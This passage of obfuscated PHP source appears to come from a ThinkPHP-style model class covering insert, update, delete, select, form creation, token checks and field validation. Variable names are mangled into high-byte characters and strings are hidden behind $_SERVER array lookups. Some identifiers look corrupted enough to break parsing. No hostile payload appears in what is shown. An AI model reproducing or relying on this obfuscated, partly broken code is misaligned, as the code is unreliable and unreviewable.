{ } public function addAll($Çİ÷Öú, $•óÈä = array(), $óıÁŒéÆ = false) { $œ¹¦âÌÜ =& $_SERVER[ï»»·÷á]; if (empty($Çİ÷Öú)) { $this->error = think_lang($œ¹¦âÌÜ[271]); return !1; } $•óÈä = $this->_parseOptions($•óÈä); foreach ($Çİ÷Öú as $¡ÓÎõ° => $Ö‘ÖãŞ) { $Çİ÷Öú[$¡ÓÎõ°] = $this->_facade($Ö‘ÖãŞ); } if (method_exists($this->db, $œ¹¦âÌÜ[272])) { $—ìİÁ¾¤ = $this->db->insertAll($Çİ÷Öú, $•óÈä, $óıÁŒéÆ); } else { $this->startTrans(); foreach ($Çİ÷Öú as $¡ÓÎõ° => $Ö‘ÖãŞ) { $—ìİÁ¾¤ = $this->db->insert($Ö‘ÖãŞ, $•óÈä, $óıÁŒéÆ); } $this->commit(); } if (!1 !== $—ìİÁ¾¤) { $¤¼ïÊ„’ = $this->getLastInsID(); if ($¤¼ïÊ„’) { return $¤¼ïÊ„’; } } return $—ìİÁ¾¤; } public function selectAdd($—ÈŸÖ†í = '', $Åáùíõ­ = '', $Ú˜‘í— = array()) { $½½šğõñ =& $_SERVER[ï»»·÷á]; $Ú˜‘í— = $this->_parseOptions($Ú˜‘í—); if (!1 === ($çîôëŸ‘ = $this->db->selectInsert($—ÈŸÖ†í ? $—ÈŸÖ†í : $Ú˜‘í—[$½½šğõñ[273]], $Åáùíõ­ ? $Åáùíõ­ : $this->getTableName(), $Ú˜‘í—))) { $this->error = think_lang($½½šğõñ[274]); return !1; } else { return $çîôëŸ‘; } } public function save($Å’¡›¬µ = '', $ñ‰Ó§ıĞ = array()) { $¯‚ê¾ğÑ =& $_SERVER[ï»»·÷á]; if (empty($Å’¡›¬µ)) { if (!empty($this->data)) { $Å’¡›¬µ = $this->data; $this->data = array(); } else { $this->error = think_lang($¯‚ê¾ğÑ[271]); return !1; } } $Å’¡›¬µ = $this->_facade($Å’¡›¬µ); $ñ‰Ó§ıĞ = $this->_parseOptions($ñ‰Ó§ıĞ); $Ÿ†¶„­ƒ = $this->getPk(); if (!isset($ñ‰Ó§ıĞ[$¯‚ê¾ğÑ[275]])) { if (isset($Å’¡›¬µ[$Ÿ†¶„­ƒ])) { $ä¿˜‡â„[$Ÿ†¶„­ƒ] = $Å’¡›¬µ[$Ÿ†¶„­ƒ]; $ñ‰Ó§ıĞ[$¯‚ê¾ğÑ[275]] = $ä¿˜‡â„; unset($Å’¡›¬µ[$Ÿ†¶„­ƒ]); } else { $this->error = think_lang($¯‚ê¾ğÑ[274]); return !1; } } if (is_array($ñ‰Ó§ıĞ[$¯‚ê¾ğÑ[275]]) && isset($ñ‰Ó§ıĞ[$¯‚ê¾ğÑ[275]][$Ÿ†¶„­ƒ])) { $ûí©ÀÎ = $ñ‰Ó§ıĞ[$¯‚ê¾ğÑ[275]][$Ÿ†¶„­ƒ]; } if (!1 === $this->_beforeUpdate($Å’¡›¬µ, $ñ‰Ó§ıĞ)) { return !1; } $À³şÌ´Â = $this->db->update($Å’¡›¬µ, $ñ‰Ó§ıĞ); if (!1 !== $À³şÌ´Â) { if (isset($ûí©ÀÎ)) { $Å’¡›¬µ[$Ÿ†¶„­ƒ] = $ûí©ÀÎ; } $this->_afterUpdate($Å’¡›¬µ, $ñ‰Ó§ıĞ); } return $À³şÌ´Â; } protected function _beforeUpdate(&$Ş÷ØĞÇ, $ªõŠ£áé) { } protected function _afterUpdate($›×¹ÃÓø, $©”ä¯„¼) { } public function delete($••é€à¨ = array()) { $€®Éº • =& $_SERVER[ï»»·÷á]; if (empty($••é€à¨) && empty($this->options[$€®Éº •[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $”‰îæï = $this->getPk(); if (is_numeric($••é€à¨) || is_string($••é€à¨)) { if (strpos($••é€à¨, $€®Éº •[50])) { $ñÎÕÕ¦[$”‰îæï] = array($€®Éº •[276], $••é€à¨); } else { $ñÎÕÕ¦[$”‰îæï] = $••é€à¨; } $this->options[$€®Éº •[275]] = $ñÎÕÕ¦; } $••é€à¨ = $this->_parseOptions(); if (is_array($••é€à¨[$€®Éº •[275]]) && isset($••é€à¨[$€®Éº •[275]][$”‰îæï])) { $Óå…Ãõ€ = $••é€à¨[$€®Éº •[275]][$”‰îæï]; } $ÔÊ³À³Ä = $this->db->delete($••é€à¨); if (!1 !== $ÔÊ³À³Ä) { $ÁêÚ¾…½ = array(); if (isset($Óå…Ãõ€)) { $ÁêÚ¾…½[$”‰îæï] = $Óå…Ãõ€; } $this->_after_delete($ÁêÚ¾…½, $••é€à¨); } return $ÔÊ³À³Ä; } protected function _after_delete($ş´²çÒó, $¤â¼ÕìÈ) { } public function select($Ü©„Ÿà = array()) { $«çĞ¸œ =& $_SERVER[ï»»·÷á]; if (is_string($Ü©„Ÿà) || is_numeric($Ü©„Ÿà)) { $œÍ·ñª¼ = $this->getPk(); if (strpos($Ü©„Ÿà, $«çĞ¸œ[50])) { $Õğ¹æßû[$œÍ·ñª¼] = array($«çĞ¸œ[276], $Ü©„Ÿà); } else { $Õğ¹æßû[$œÍ·ñª¼] = $Ü©„Ÿà; } $this->options[$«çĞ¸œ[275]] = $Õğ¹æßû; } elseif (!1 === $Ü©„Ÿà) { $Ü©„Ÿà = $this->_parseOptions(); return $«çĞ¸œ[277] . $this->db->buildSelectSql($Ü©„Ÿà) . $«çĞ¸œ[278]; } $Ü©„Ÿà = $this->_parseOptions(); $¥÷±ÆŞ– = $this->db->select($Ü©„Ÿà); if (!1 === $¥÷±ÆŞ–) { return !1; } if (empty($¥÷±ÆŞ–)) { return null; } $this->_afterSelect($¥÷±ÆŞ–, $Ü©„Ÿà); return $¥÷±ÆŞ–; } protected function _afterSelect(&$„İö¼é, $ÓïšµÌè) { } public function buildSql($´íÜ¯³Ê = array()) { $é—ı¡ßÔ =& $_SERVER[ï»»·÷á]; $´íÜ¯³Ê = $this->_parseOptions($´íÜ¯³Ê); return $é—ı¡ßÔ[277] . $this->db->buildSelectSql($´íÜ¯³Ê) . $é—ı¡ßÔ[278]; } public function optionsValue($”´ °ÕĞ = null) { if (is_null($”´ °ÕĞ)) { return $this->options; } elseif (is_array($”´ °ÕĞ)) { $this->options = array_merge($this->options, $”´ °ÕĞ); } } protected function _parseOptions($¯Ü‰Ìµ = array()) { $‘£¨öĞ° =& $_SERVER[ï»»·÷á]; if (is_array($¯Ü‰Ìµ)) { $¯Ü‰Ìµ = array_merge($this->options, $¯Ü‰Ìµ); } $this->options = array(); if (!isset($¯Ü‰Ìµ[$‘£¨öĞ°[279]])) { $¯Ü‰Ìµ[$‘£¨öĞ°[279]] = $this->getTableName(); $³„Ñ¼’Ö = $this->fields; } else { $³„Ñ¼’Ö = $this->getDbFields(); } if (!empty($¯Ü‰Ìµ[$‘£¨öĞ°[280]])) { $¯Ü‰Ìµ[$‘£¨öĞ°[279]] .= $‘£¨öĞ°[53] . $¯Ü‰Ìµ[$‘£¨öĞ°[280]]; } $¯Ü‰Ìµ[$‘£¨öĞ°[281]] = $this->name; if (isset($¯Ü‰Ìµ[$‘£¨öĞ°[275]]) && is_array($¯Ü‰Ìµ[$‘£¨öĞ°[275]]) && !empty($³„Ñ¼’Ö) && !isset($¯Ü‰Ìµ[$‘£¨öĞ°[282]]) && !isset($¯Ü‰Ìµ[$‘£¨öĞ°[279]])) { foreach ($¯Ü‰Ìµ[$‘£¨öĞ°[275]] as $”ç˜Œ‡ => $ÖŒ¢ç°…) { $”ç˜Œ‡ = trim($”ç˜Œ‡); if (in_array($”ç˜Œ‡, $³„Ñ¼’Ö, !0)) { if (is_scalar($ÖŒ¢ç°…)) { $this->_parseType($¯Ü‰Ìµ[$‘£¨öĞ°[275]], $”ç˜Œ‡); } } elseif (!is_numeric($”ç˜Œ‡) && $‘£¨öĞ°[11] != substr($”ç˜Œ‡, 0, 1) && !1 === strpos($”ç˜Œ‡, $‘£¨öĞ°[10]) && !1 === strpos($”ç˜Œ‡, $‘£¨öĞ°[260]) && !1 === strpos($”ç˜Œ‡, $‘£¨öĞ°[283]) && !1 === strpos($”ç˜Œ‡, $‘£¨öĞ°[284])) { unset($¯Ü‰Ìµ[$‘£¨öĞ°[275]][$”ç˜Œ‡]); } } } $this->_options_filter($¯Ü‰Ìµ); return $¯Ü‰Ìµ; } protected function _options_filter(&$ÏÓ³ô…) { } protected function _parseType(&$ê«Ô…Ùº, $Ïï‹”ñ«) { $ıç§„İÑ =& $_SERVER[ï»»·÷á]; if (empty($this->options[$ıç§„İÑ[285]][$ıç§„İÑ[4] . $Ïï‹”ñ«])) { $êßÌÆ†é = strtolower($this->fields[$ıç§„İÑ[252]][$Ïï‹”ñ«]); if (!1 !== strpos($êßÌÆ†é, $ıç§„İÑ[286])) { } elseif (!1 === strpos($êßÌÆ†é, $ıç§„İÑ[287]) && !1 !== strpos($êßÌÆ†é, $ıç§„İÑ[288])) { $ê«Ô…Ùº[$Ïï‹”ñ«] = intval($ê«Ô…Ùº[$Ïï‹”ñ«]); } elseif (!1 !== strpos($êßÌÆ†é, $ıç§„İÑ[289]) || !1 !== strpos($êßÌÆ†é, $ıç§„İÑ[290])) { $ê«Ô…Ùº[$Ïï‹”ñ«] = floatval($ê«Ô…Ùº[$Ïï‹”ñ«]); } elseif (!1 !== strpos($êßÌÆ†é, $ıç§„İÑ[291])) { $ê«Ô…Ùº[$Ïï‹”ñ«] = (bool) $ê«Ô…Ùº[$Ïï‹”ñ«]; } } } public function find($—È»¨£ = array()) { $Ö¢ù½ÊÊ =& $_SERVER[ï»»·÷á]; if (is_numeric($—È»¨£) || is_string($—È»¨£)) { $åÖ¤ô€ñ[$this->getPk()] = intval($—È»¨£); $this->options[$Ö¢ù½ÊÊ[275]] = $åÖ¤ô€ñ; } $this->options[$Ö¢ù½ÊÊ[292]] = 1; $—È»¨£ = $this->_parseOptions(); $¢¸÷òğº = $this->db->select($—È»¨£); if (!1 === $¢¸÷òğº) { return !1; } if (empty($¢¸÷òğº)) { return null; } $this->data = $¢¸÷òğº[0]; $this->_afterFind($this->data, $—È»¨£); if (!empty($this->options[$Ö¢ù½ÊÊ[293]])) { return $this->returnResult($this->data, $this->options[$Ö¢ù½ÊÊ[293]]); } return $this->data; } protected function _afterFind(&$°”­ë©, $•¬£¦¹) { } protected function returnResult($‚ß¨í, $å³¢Ô» = '') { $¡ÛÔéœ¡ =& $_SERVER[ï»»·÷á]; if ($å³¢Ô») { if (is_callable($å³¢Ô»)) { return call_user_func($å³¢Ô», $‚ß¨í); } switch (strtolower($å³¢Ô»)) { case $¡ÛÔéœ¡[294]: return json_encode($‚ß¨í); case $¡ÛÔéœ¡[295]: return xml_encode($‚ß¨í); } } return $‚ß¨í; } public function parseFieldsMap($Ü±ÒÁ½è, $ãåíË·Ö = 1) { if (!empty($this->_map)) { foreach ($this->_map as $»§†™ºË => $äÕ€å) { if ($ãåíË·Ö == 1) { if (isset($Ü±ÒÁ½è[$äÕ€å])) { $Ü±ÒÁ½è[$»§†™ºË] = $Ü±ÒÁ½è[$äÕ€å]; unset($Ü±ÒÁ½è[$äÕ€å]); } } else { if (isset($Ü±ÒÁ½è[$»§†™ºË])) { $Ü±ÒÁ½è[$äÕ€å] = $Ü±ÒÁ½è[$»§†™ºË]; unset($Ü±ÒÁ½è[$»§†™ºË]); } } } } return $Ü±ÒÁ½è; } public function setField($äûÎÒÓâ, $İíåàî = '') { if (is_array($äûÎÒÓâ)) { $˜±—œ´· = $äûÎÒÓâ; } else { $˜±—œ´·[$äûÎÒÓâ] = $İíåàî; } return $this->save($˜±—œ´·); } public function setAdd($³¥ãä´ı, $€Ê·™“ë = 1) { $ëşæ®€ =& $_SERVER[ï»»·÷á]; $¹Ùâ€È = $³¥ãä´ı . $ëşæ®€[296] . $€Ê·™“ë; if ($€Ê·™“ë < 0) { $¹Ùâ€È = $³¥ãä´ı . $€Ê·™“ë; } return $this->setField($³¥ãä´ı, array($ëşæ®€[297], $¹Ùâ€È)); } public function getField($ƒ´´ÀåÌ, $“â˜½Óİ = null) { $€¬öûŒ =& $_SERVER[ï»»·÷á]; $«æ¶ƒÔ×[$€¬öûŒ[273]] = $ƒ´´ÀåÌ; $«æ¶ƒÔ× = $this->_parseOptions($«æ¶ƒÔ×); $ƒ´´ÀåÌ = trim($ƒ´´ÀåÌ); if (strpos($ƒ´´ÀåÌ, $€¬öûŒ[50])) { if (!isset($«æ¶ƒÔ×[$€¬öûŒ[292]])) { $«æ¶ƒÔ×[$€¬öûŒ[292]] = is_numeric($“â˜½Óİ) ? $“â˜½Óİ : $€¬öûŒ[12]; } $í‰ØàõÏ = $this->db->select($«æ¶ƒÔ×); if (!empty($í‰ØàõÏ)) { $”°»ÎÚŸ = explode($€¬öûŒ[50], $ƒ´´ÀåÌ); $ƒ´´ÀåÌ = array_keys($í‰ØàõÏ[0]); $Ã˜ŒÙ‹Ä = array_shift($ƒ´´ÀåÌ); $é§´¿‹ø = array_shift($ƒ´´ÀåÌ); $„§í¿Øú = array(); $¯Óëü’î = count($”°»ÎÚŸ); foreach ($í‰ØàõÏ as $¨ÄéÊî¨) { $ı­ß†Ğ• = $¨ÄéÊî¨[$Ã˜ŒÙ‹Ä]; if (2 == $¯Óëü’î) { $„§í¿Øú[$ı­ß†Ğ•] = $¨ÄéÊî¨[$é§´¿‹ø]; } else { $„§í¿Øú[$ı­ß†Ğ•] = is_string($“â˜½Óİ) ? implode($“â˜½Óİ, $¨ÄéÊî¨) : $¨ÄéÊî¨; } } return $„§í¿Øú; } } else { if (!0 !== $“â˜½Óİ) { $«æ¶ƒÔ×[$€¬öûŒ[292]] = is_numeric($“â˜½Óİ) ? $“â˜½Óİ : 1; } if ($“â˜½Óİ === $€¬öûŒ[255]) { unset($«æ¶ƒÔ×[$€¬öûŒ[292]]); } $¨ÄéÊî¨ = $this->db->select($«æ¶ƒÔ×); if (!empty($¨ÄéÊî¨)) { if ($“â˜½Óİ === $€¬öûŒ[255]) { return reset($¨ÄéÊî¨[0]); } if (!0 !== $“â˜½Óİ && 1 == $«æ¶ƒÔ×[$€¬öûŒ[292]]) { return reset($¨ÄéÊî¨[0]); } foreach ($¨ÄéÊî¨ as $‘Åù©»ó) { $Úµ’ñôİ[] = $‘Åù©»ó[$ƒ´´ÀåÌ]; } return $Úµ’ñôİ; } } return null; } public function create($‚Œ°Ÿ¨ = '', $èñß¶§´ = '') { $Ÿæ¡ïÀ =& $_SERVER[ï»»·÷á]; if (empty($‚Œ°Ÿ¨)) { $‚Œ°Ÿ¨ = $_POST; } elseif (is_object($‚Œ°Ÿ¨)) { $‚Œ°Ÿ¨ = get_object_vars($‚Œ°Ÿ¨); } if (empty($‚Œ°Ÿ¨) || !is_array($‚Œ°Ÿ¨)) { $this->error = think_lang($Ÿæ¡ïÀ[271]); return !1; } $‚Œ°Ÿ¨ = $this->parseFieldsMap($‚Œ°Ÿ¨, 0); $èñß¶§´ = $èñß¶§´ ? $èñß¶§´ : (!empty($‚Œ°Ÿ¨[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ÿæ¡ïÀ[273]])) { $Ûı©çÄ = $this->options[$Ÿæ¡ïÀ[273]]; unset($this->options[$Ÿæ¡ïÀ[273]]); } elseif ($èñß¶§´ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ûı©çÄ = $this->insertFields; } elseif ($èñß¶§´ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ûı©çÄ = $this->updateFields; } if (isset($Ûı©çÄ)) { if (is_string($Ûı©çÄ)) { $Ûı©çÄ = explode($Ÿæ¡ïÀ[50], $Ûı©çÄ); } if (think_config($Ÿæ¡ïÀ[298])) { $Ûı©çÄ[] = think_config($Ÿæ¡ïÀ[299]); } foreach ($‚Œ°Ÿ¨ as $Ğåò‘¼© => $¬­Âã‹•) { if (!in_array($Ğåò‘¼©, $Ûı©çÄ)) { unset($‚Œ°Ÿ¨[$Ğåò‘¼©]); } } } if (!$this->autoValidation($‚Œ°Ÿ¨, $èñß¶§´)) { return !1; } if (!$this->autoCheckToken($‚Œ°Ÿ¨)) { $this->error = think_lang($Ÿæ¡ïÀ[300]); return !1; } if ($this->autoCheckFields) { $Ûı©çÄ = $this->getDbFields(); foreach ($‚Œ°Ÿ¨ as $Ğåò‘¼© => $¬­Âã‹•) { if (!in_array($Ğåò‘¼©, $Ûı©çÄ)) { unset($‚Œ°Ÿ¨[$Ğåò‘¼©]); } elseif (MAGIC_QUOTES_GPC && is_string($¬­Âã‹•)) { $‚Œ°Ÿ¨[$Ğåò‘¼©] = stripslashes($¬­Âã‹•); } } } $this->autoOperation($‚Œ°Ÿ¨, $èñß¶§´); $this->data = $‚Œ°Ÿ¨; return $‚Œ°Ÿ¨; } public function autoCheckToken($ûß¡¾€‹) { $°Óó¡ÊÑ =& $_SERVER[ï»»·÷á]; if (isset($this->options[$°Óó¡ÊÑ[301]]) && !$this->options[$°Óó¡ÊÑ[301]]) { return !0; } if (think_config($°Óó¡ÊÑ[298])) { $İİî„Ÿ½ = think_config($°Óó¡ÊÑ[299]); if (!isset($ûß¡¾€‹[$İİî„Ÿ½]) || Session::get($İİî„Ÿ½)) { return !1; } list($ÂÌû„ŞÏ, $ääş»Õ§) = explode($°Óó¡ÊÑ[11], $ûß¡¾€‹[$İİî„Ÿ½]); if ($ääş»Õ§ && Session::get($İİî„Ÿ½ . $°Óó¡ÊÑ[10] . $ÂÌû„ŞÏ) === $ääş»Õ§) { Session::remove($İİî„Ÿ½ . $°Óó¡ÊÑ[10] . $ÂÌû„ŞÏ); return !0; } if (think_config($°Óó¡ÊÑ[302])) { Session::remove($İİî„Ÿ½ . $°Óó¡ÊÑ[10] . $ÂÌû„ŞÏ); } return !1; } return !0; } public function regex($³›‘ù²ş, $ˆÁÏ›‹µ) { $êˆé“âÍ =& $_SERVER[ï»»·÷á]; $«Èú©šÉ = array($êˆé“âÍ[303] => $êˆé“âÍ[304], $êˆé“âÍ[305] => $êˆé“âÍ[306], $êˆé“âÍ[307] => $êˆé“âÍ[308], $êˆé“âÍ[309] => $êˆé“âÍ[310], $êˆé“âÍ[311] => $êˆé“âÍ[312], $êˆé“âÍ[313] => $êˆé“âÍ[314], $êˆé“âÍ[315] => $êˆé“âÍ[316], $êˆé“âÍ[290] => $êˆé“âÍ[317], $êˆé“âÍ[318] => $êˆé“âÍ[319]); if (isset($«Èú©šÉ[strtolower($ˆÁÏ›‹µ)])) { $ˆÁÏ›‹µ = $«Èú©šÉ[strtolower($ˆÁÏ›‹µ)]; } return preg_match($ˆÁÏ›‹µ, $³›‘ù²ş) === 1; } private function autoOperation(&$ôÔ·õË—, $„ÁÉ²ˆË) { $Ğ¸—Øœ‚ =& $_SERVER[ï»»·÷á]; if (!empty($this->options[$Ğ¸—Øœ‚[320]])) { $â×€Ì®ü = $this->options[$Ğ¸—Øœ‚[320]]; unset($this->options[$Ğ¸—Øœ‚[320]]); } elseif (!empty($this->_auto)) { $â×€Ì®ü = $this->_auto; } if (isset($â×€Ì®ü)) { foreach ($â×€Ì®ü as $–ŠÛÄÕ¾) { if (empty($–ŠÛÄÕ¾[2])) { $–ŠÛÄÕ¾[2] = THINK_MODEL_INSERT; } if ($„ÁÉ²ˆË == $–ŠÛÄÕ¾[2] || $–ŠÛÄÕ¾[2] == THINK_MODEL_BOTH) { switch (trim($–ŠÛÄÕ¾[3])) { case $Ğ¸—Øœ‚[321]: case $Ğ¸—Øœ‚[322]: $¼®„Ï¢ƒ = isset($–ŠÛÄÕ¾[4]) ? (array) $–ŠÛÄÕ¾[4] : array(); if (isset($ôÔ·õË—[$–ŠÛÄÕ¾[0]])) { array_unshift($¼®„Ï¢ƒ, $ôÔ·õË—[$–ŠÛÄÕ¾[0]]); } if ($Ğ¸—Øœ‚[321] == $–ŠÛÄÕ¾[3]) { $ôÔ·õË—[$–ŠÛÄÕ¾[0]] = call_user_func_array($–ŠÛÄÕ¾[1], $¼®„Ï¢ƒ); } else { $ôÔ·õË—[$–ŠÛÄÕ¾[0]] = call_user_func_array(array(&$this, $–ŠÛÄÕ¾[1]), $¼®„Ï¢ƒ); } break; case $Ğ¸—Øœ‚[273]: $ôÔ·õË—[$–ŠÛÄÕ¾[0]] = $ôÔ·õË—[$–ŠÛÄÕ¾[1]]; break; case $Ğ¸—Øœ‚[323]: if ($Ğ¸—Øœ‚[12] === $ôÔ·õË—[$–ŠÛÄÕ¾[0]]) { unset($ôÔ·õË—[$–ŠÛÄÕ¾[0]]); } break; case $Ğ¸—Øœ‚[324]: default: $ôÔ·õË—[$–ŠÛÄÕ¾[0]] = $–ŠÛÄÕ¾[1]; } if (!1 === $ôÔ·õË—[$–ŠÛÄÕ¾[0]]) { unset($ôÔ·õË—[$–ŠÛÄÕ¾[0]]); } } } } return $ôÔ·õË—; } protected function autoValidation($ÌÍ“¿Í§, $ÚÙğ§şÚ) { $¿úõéØ =& $_SERVER[ï»»·÷á]; if (!empty($this->options[$¿úõéØ[325]])) { $¼”ú« = $this->options[$¿úõéØ[325]]; unset($this->options[$¿úõéØ[325]]); } elseif (!empty($this->_validate)) { $¼”ú« = $this->_validate; } if (isset($¼”ú«)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¼”ú« as $ĞÍòˆ†ì => $‚Ù¿Ú–Ö) { if (empty($‚Ù¿Ú–Ö[5]) || $‚Ù¿Ú–Ö[5] == THINK_MODEL_BOTH || $‚Ù¿Ú–Ö[5] == $ÚÙğ§şÚ) { if (0 == strpos($‚Ù¿Ú–Ö[2], $¿úõéØ[326]) && strpos($‚Ù¿Ú–Ö[2], $¿úõéØ[327])) { $‚Ù¿Ú–Ö[2] = think_lang(substr($‚Ù¿Ú–Ö[2], 2, -1)); } $‚Ù¿Ú–Ö[3] = isset($‚Ù¿Ú–Ö[3]) ? $‚Ù¿Ú–Ö[3] : THINK_EXISTS_VALIDATE; $‚Ù¿Ú–Ö[4] = isset($‚Ù¿Ú–Ö[4]) ? $‚Ù¿Ú–Ö[4] : $¿úõéØ[328]; switch ($‚Ù¿Ú–Ö[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÌÍ“¿Í§, $‚Ù¿Ú–Ö)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¿úõéØ[12] != trim($ÌÍ“¿Í§[$‚Ù¿Ú–Ö[0]])) { if (!1 === $this->_validationField($ÌÍ“¿Í§, $‚Ù¿Ú–Ö)) { return !1; } } break; default: if (isset($ÌÍ“¿Í§[$‚Ù¿Ú–Ö[0]])) { if (!1 === $this->_validationField($ÌÍ“¿Í§, $‚Ù¿Ú–Ö)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¹è‘à, $ÜŞÃ¢©Ø) { if (!1 === $this->_validationFieldItem($¹è‘à, $ÜŞÃ¢©Ø)) { if ($this->patchValidate) { $this->error[$ÜŞÃ¢©Ø[0]] = $ÜŞÃ¢©Ø[2]; } else { $this->error = $ÜŞÃ¢©Ø[2]; return !1; } } return; } protected function _validationFieldItem($Ì…ºç‡‡, $Ôãáº“İ) { $»ÃÅñç =& $_SERVER[ï»»·÷á]; switch (strtolower(trim($Ôãáº“İ[4]))) { case $»ÃÅñç[321]: case $»ÃÅñç[322]: $·×…È·ó = isset($Ôãáº“İ[6]) ? (array) $Ôãáº“İ[6] : array(); if (is_string($Ôãáº“İ[0]) && strpos($Ôãáº“İ[0], $»ÃÅñç[50])) { $Ôãáº“İ[0] = explode($»ÃÅñç[50], $Ôãáº“İ[0]); } if (is_array($Ôãáº“İ[0])) { foreach ($Ôãáº“İ[0] as $›‚áÏƒ—) { $ïŸ±‡Ş[$›‚áÏƒ—] = $Ì…ºç‡‡[$›‚áÏƒ—]; } array_unshift($·×…È·ó, $ïŸ±‡Ş); } else { array_unshift($·×…È·ó, $Ì…ºç‡‡[$Ôãáº“İ[0]]); } if ($»ÃÅñç[321] == $Ôãáº“İ[4]) { return call_user_func_array($Ôãáº“İ[1], $·×…È·ó); } else { return call_user_func_array(array(&$this, $Ôãáº“İ[1]), $·×…È·ó); } case $»ÃÅñç[329]: return $Ì…ºç‡‡[$Ôãáº“İ[0]] == $Ì…ºç‡‡[$Ôãáº“İ[1]]; case $»ÃÅñç[330]: if (is_string($Ôãáº“İ[0]) && strpos($Ôãáº“İ[0], $»ÃÅñç[50])) { $Ôãáº“İ[0] = explode($»ÃÅñç[50], $Ôãáº“İ[0]); } $Ã¥Ìî×î = array(); if (is_array($Ôãáº“İ[0])) { foreach ($Ôãáº“İ[0] as $›‚áÏƒ—) { $Ã¥Ìî×î[$›‚áÏƒ—] = $Ì…ºç‡‡[$›‚áÏƒ—]; } } else { $Ã¥Ìî×î[$Ôãáº“İ[0]] = $Ì…ºç‡‡[$Ôãáº“İ[0]]; } if (!empty($Ì…ºç‡‡[$this->getPk()])) { $Ã¥Ìî×î[$this->getPk()] = array($»ÃÅñç[331], $Ì…ºç‡‡[$this->getPk()]); } if ($this->where($Ã¥Ìî×î)->find()) { return !1; } return !0; default: return $this->check($Ì…ºç‡‡[$Ôãáº“İ[0]], $Ôãáº“İ[1], $Ôãáº“İ[4]); } } public function check($éËÍ“™, $âñ°¶Î˜, $õ€ûîÃ» = "\x72\x65\147\x65\x78") { $Õ„Õ¥•ú =& $_SERVER[ï»»·÷á]; $õ€ûîÃ» = strtolower(trim($õ€ûîÃ»)); switch ($õ€ûîÃ») { case $Õ„Õ¥•ú[7]: case $Õ„Õ¥•ú[332]: $‹çë¬¼û = is_array($âñ°¶Î˜) ? $âñ°¶Î˜ : explode($Õ„Õ¥•ú[50], $âñ°¶Î˜); return $õ€ûîÃ» == $Õ„Õ¥•ú[7] ? in_array($éËÍ“™, $‹çë¬¼û) : !in_array($éËÍ“™, $‹çë¬¼û); case $Õ„Õ¥•ú[333]: case $Õ„Õ¥•ú[334]: if (is_array($âñ°¶Î˜)) { $ÍÖŒÔÉñ = $âñ°¶Î˜[0]; $ÓÆÃ¤Û« = $âñ°¶Î˜[1]; } else { list($ÍÖŒÔÉñ, $ÓÆÃ¤Û«) = explode($Õ„Õ¥•ú[50], $âñ°¶Î˜); } return $õ€ûîÃ» == $Õ„Õ¥•ú[333] ? $éËÍ“™ >= $ÍÖŒÔÉñ && $éËÍ“™ <= $ÓÆÃ¤Û« : $éËÍ“™ < $ÍÖŒÔÉñ || $éËÍ“™ > $ÓÆÃ¤Û«; case $Õ„Õ¥•ú[335]: case $Õ„Õ¥•ú[336]: return $õ€ûîÃ» == $Õ„Õ¥•ú[335] ? $éËÍ“™ == $âñ°¶Î˜ : $éËÍ“™ != $âñ°¶Î˜; case $Õ„Õ¥•ú[337]: $ö“É²µ = mb_strlen($éËÍ“™, $Õ„Õ¥•ú[338]); if (strpos($âñ°¶Î˜, $Õ„Õ¥•ú[50])) { list($ÍÖŒÔÉñ, $ÓÆÃ¤Û«) = explode($Õ„Õ¥•ú[50], $âñ°¶Î˜); return $ö“É²µ >= $ÍÖŒÔÉñ && $ö“É²µ <= $ÓÆÃ¤Û«; } else { return $ö“É²µ == $âñ°¶Î˜; } case $Õ„Õ¥•ú[339]: list($‚¤š·Ì, $úªºêË) = explode($Õ„Õ¥•ú[50], $âñ°¶Î˜); if (!is_numeric($‚¤š·Ì)) { $‚¤š·Ì = strtotime($‚¤š·Ì); } if (!is_numeric($úªºêË)) { $úªºêË = strtotime($úªºêË); } return NOW_TIME >= $‚¤š·Ì && NOW_TIME <= $úªºêË; case $Õ„Õ¥•ú[340]: return in_array(get_client_ip(), explode($Õ„Õ¥•ú[50], $âñ°¶Î˜)); case $Õ„Õ¥•ú[341]: return !in_array(get_client_ip(), explode($Õ„Õ¥•ú[50], $âñ°¶Î˜)); case $Õ„Õ¥•ú[328]: default: return $this->regex($éËÍ“™, $âñ°¶Î˜); } } public function query($‚±€¹ “, $Ğı¤ıŠ = false) { $»˜ĞÚÓ‚ =& $_SERVER[ï»»·÷á]; if (!is_bool($Ğı¤ıŠ) && !is_array($Ğı¤ıŠ)) { $Ğı¤ıŠ = func_get_args(); array_shift($Ğı¤ıŠ); } $‚±€¹ “ = str_replace(array($»˜ĞÚÓ‚[231], $»˜ĞÚÓ‚[342]), $»˜ĞÚÓ‚[53], $‚±€¹ “); $‚±€¹ “ = $this->parseSql($‚±€¹ “, $Ğı¤ıŠ); return $this->db->query($‚±€¹ “); } public function execute($íç«áíã, $¥±—áËÄ = false) { if (!is_bool($¥±—áËÄ) && !is_array($¥±—áËÄ)) { $¥±—áËÄ = func_get_args(); array_shift($¥±—áËÄ); } $íç«áíã = $this->parseSql($íç«áíã, $¥±—áËÄ); return $this->db->execute($íç«áíã); } protected function parseSql($‡ŞÑ¦, $Ò›ÒÅÈ) { $Á½ÅöóÓ =& $_SERVER[ï»»·÷á]; if (!0 === $Ò›ÒÅÈ) { $Û´¯¯†¹ = $this->_parseOptions(); $‡ŞÑ¦ = $this->db->parseSql($‡ŞÑ¦, $Û´¯¯†¹); } elseif (is_array($Ò›ÒÅÈ)) { $Ò›ÒÅÈ = array_map(array($this->db, $Á½ÅöóÓ[343]), $Ò›ÒÅÈ); $‡ŞÑ¦ = vsprintf($‡ŞÑ¦, $Ò›ÒÅÈ); } else { $‡ŞÑ¦ = strtr($‡ŞÑ¦, array($Á½ÅöóÓ[344] => $this->getTableName(), $Á½ÅöóÓ[345] => think_config($Á½ÅöóÓ[244]))); } $this->db->setModel($this->name); return $‡ŞÑ¦; } public function db($•‚øïÛ = '', $ãıÄ·æÃ = '', $ÏĞ‘” = array()) { $‚Â­Øùğ =& $_SERVER[ï»»·÷á]; if ($‚Â­Øùğ[12] === $•‚øïÛ && $this->db) { return 